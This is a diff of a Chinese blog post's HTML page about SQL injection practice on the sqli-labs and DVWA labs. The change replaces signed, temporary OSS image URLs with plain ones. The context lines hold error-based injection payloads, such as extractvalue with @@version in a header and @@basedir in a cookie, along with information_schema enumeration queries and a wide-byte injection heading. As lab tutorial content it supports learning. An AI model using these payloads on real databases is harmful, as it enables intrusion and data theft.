@@ -89,16 +89,16 @@
 <meta property="og:site_name" content="peri0d的博客">
 <meta property="og:description" content="一些问题sqli-labs和dvwa在用火狐时发现一个问题，在浏览器的URL栏输入 # 时，会把 # 后面的都注释掉，比如，127.0.0.1/index.php?id=1#qwerasdf，通过抓包发现请求的是127.0.0.1/index.php?id=1 由此得到结论，# 对于浏览器就是注释的意思。这也就解释了sqli-labs中在有些关卡在URL中输入 # 无效但是 %23 有效的状况 同">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/1.png?Expires=1562562624&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=FY9IT5FL7wxAwKjJz4iLq0FC6iU%3D">
-<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/2.jpg?Expires=1562562635&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=7oxoF3LUbtsrryrWEdHwRgQOEfw%3D">
-<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/3.png?Expires=1562562646&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=ykDzvLLdY%2FXeSZKJ5lJfqalo2fY%3D">
-<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/4.png?Expires=1562562671&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=CiswQFrjResw61oZ1dn55529KC0%3D">
-<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/5.png?Expires=1562562679&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=%2BGqq%2FK6btogyESC%2B5u51ebQHGtg%3D">
-<meta property="og:updated_time" content="2019-07-08T04:11:44.231Z">
+<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/1.png">
+<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/2.jpg">
+<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/3.png">
+<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/4.png">
+<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/5.png">
+<meta property="og:updated_time" content="2019-07-08T04:41:13.322Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL 注入">
 <meta name="twitter:description" content="一些问题sqli-labs和dvwa在用火狐时发现一个问题，在浏览器的URL栏输入 # 时，会把 # 后面的都注释掉，比如，127.0.0.1/index.php?id=1#qwerasdf，通过抓包发现请求的是127.0.0.1/index.php?id=1 由此得到结论，# 对于浏览器就是注释的意思。这也就解释了sqli-labs中在有些关卡在URL中输入 # 无效但是 %23 有效的状况 同">
-<meta name="twitter:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/1.png?Expires=1562562624&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=FY9IT5FL7wxAwKjJz4iLq0FC6iU%3D">
+<meta name="twitter:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/1.png">
 
 
 
@@ -416,7 +416,7 @@
 
 <p>如果想判断第二个表，把 limit 0,1 改为 limit 1,1 即可</p>
 <p>但是regexp中不可以，只要是table_name中的内容，regexp都可以匹配到</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/1.png?Expires=1562562624&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=FY9IT5FL7wxAwKjJz4iLq0FC6iU%3D" alt="img"></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/1.png" alt="img"></p>
 <h2 id="数据列-1"><a href="#数据列-1" class="headerlink" title="数据列"></a>数据列</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=database() limit 0,1</span><br></pre></td></tr></table></figure>
 
 <p>改为</p>
@@ -436,7 +436,7 @@
 <p>如果关键的表被禁用了，可以使用这种形式</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from (select 1 union select null union select !1)a group by concat(version(),floor(rand(0)*2))</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/2.jpg?Expires=1562562635&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=7oxoF3LUbtsrryrWEdHwRgQOEfw%3D" alt="img"></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/2.jpg" alt="img"></p>
 <p>如果 rand 被禁用了可以使用用户变量来报错(实测未成功)</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select min(@a:=1) from information_schema.tables group by concat(password,@a:(@a+1)%2)</span><br></pre></td></tr></table></figure>
 
@@ -470,13 +470,13 @@
 <p><strong>sqli-labs Less-18</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//Less-19的 referer 同理，也可以用 floor，updatexml </span><br><span class="line">1&apos; and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/3.png?Expires=1562562646&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=ykDzvLLdY%2FXeSZKJ5lJfqalo2fY%3D" alt="img"></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/3.png" alt="img"></p>
 <p>我觉得Less-18是要输入正确的 uname 和 pass 的，否则是无法显示 user-agent</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/4.png?Expires=1562562671&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=CiswQFrjResw61oZ1dn55529KC0%3D" alt="img"></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/4.png" alt="img"></p>
 <p><strong>Less-20修改cookie</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin1&apos; and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) #</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/5.png?Expires=1562562679&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=%2BGqq%2FK6btogyESC%2B5u51ebQHGtg%3D" alt="img"></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/5.png" alt="img"></p>
 <h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>这里是针对 ‘ 和 \ 被过滤的情况，一般采用 addslashes() 和 mysql_real_escape_string() 函数</p>
 <p>两者都是对 ‘ 和 \ 进行了 replace 处理，’ 转化为 &#39; ，\ 转化为 \，但是对数字型注入无效</p>
 <p>绕过方法：</p>
